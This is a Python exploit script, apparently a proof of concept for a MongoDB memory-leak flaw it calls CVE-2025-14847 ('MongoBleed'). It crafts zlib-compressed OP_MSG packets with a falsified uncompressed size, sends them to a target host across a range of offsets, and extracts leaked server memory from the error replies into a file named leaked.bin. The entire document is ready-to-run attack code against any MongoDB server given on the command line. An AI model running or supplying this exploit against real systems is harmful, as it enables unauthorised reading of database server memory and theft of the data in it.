import sys
import socket
import struct
import zlib
import re
import argparse
import time

def prepare_payload(doc_length, buffer_size):
    # malformed bson
    content = b'\x10a\x00\x01\x00\x00\x00'
    
    # <i represent litte-endian int32 in struct
    # https://www.mongodb.com/docs/manual/reference/mongodb-wire-protocol/#sections
    bson = struct.pack('<i', doc_length) + content
    
    # <i represent little-endian unsigned-int32 in struct
    # op_msg format: flagBits(uint32) - sections(bson) - checksum(optional)
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    
    # compress op_msg
    compressed = zlib.compress(op_msg)

    # op_compressed format without header: originalOpcode(int32) - uncompressedSize(int32) - compressorId(uint8) - compressedMessage(char) 
    # op_code 2013 - dbMsg
    payload = struct.pack('<I', 2013)

    # uncompressedSize file size. root cause of vulnerability
    payload += struct.pack('<i', buffer_size)

    # compressorId 2 - zlib
    payload += struct.pack('B', 2)

    # compressedMessage
    payload += compressed

    # header format: msgLength(int32) - requestId(int32) - responseTo(int32) - opcode(int32)
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    return header + payload

def exploit(host, port, doc_length, buffer_size):
    # prepare payload
    payload = prepare_payload(doc_length, buffer_size)

    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.settimeout(3)
        soc.connect((host,port))
        soc.sendall(payload)

        response = b''

        while True:
            if(len(response) >= 4):
                msg_len = struct.unpack('<I', response[:4])[0]
                if len(response) >= msg_len:
                    break

            chunk = soc.recv(4096)

            if not chunk:
                break

            response += chunk

        soc.close()

        return response
    except Exception as e:
        return None

def find_leaked_data(response):
    if response == None:
        return []

    if len(response) < 25:
        return []
    
    try:
        # get message length
        msg_len = struct.unpack('<I', response[:4])[0]
        
        # get opcode
        opcode = struct.unpack('<I', response[12:16])[0]
       
        # check opcode and decompress response
        if opcode == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]

        leaks = []

        # extract field names from bson errors
        for match in re.finditer(rb"field name '([^']*)'", raw):
            data = match.group(1)
            if data and data not in [b'?', b'a', b'$db', b'ping', b'isMaster', b'hello']:
                leaks.append(data)
    
        # extract type bytes from unrecognized type errors
        for match in re.finditer(rb"type (\d+)", raw):
            try:
                type_val = int(match.group(1)) & 0xFF
                if type_val > 31:
                    leaks.append(bytes([type_val]))
            except ValueError:
                pass
    
        return leaks
    except Exception:
        return []

# CVE-2025-14847 | Mongo Bleed Scanner
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2025-14847 | Mongo Bleed Exploit')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=15, help='Minimum document length')
    parser.add_argument('--max-offset', type=int, default=4096, help='Maximum document length')
    args = parser.parse_args()
    
    print(f'[INFO] CVE-2025-14847 | MongoBleed')
    print(f'[INFO] Start Scanning on {args.host}:{args.port}')
    print(f'[INFO] Offset Range {args.min_offset} - {args.max_offset}')
    print()

    unique_leaked_data = set()
    all_leaked_data = bytearray()

    start_time = time.perf_counter()
    for doc_len in range(args.min_offset, args.max_offset):
        response = exploit(args.host, args.port, doc_len, doc_len + 500)
        leaked_data = find_leaked_data(response)

        for data in leaked_data:
            if data not in unique_leaked_data:
                unique_leaked_data.add(data)
           
            all_leaked_data.extend(data)
            
            if len(data) > 10:
                preview = data[:80].decode('utf-8', errors='replace')
                print(f'[DATA] {preview}')
    
    stop_time = time.perf_counter()
    
    print()
    print(f'[INFO] Total Leak: {len(all_leaked_data)} bytes')
    print(f'[INFO] Total Duration: {stop_time - start_time:0.4f} seconds')

    # write all result to leaked.bin file
    with open('leaked.bin', 'wb') as file:
        file.write(all_leaked_data)
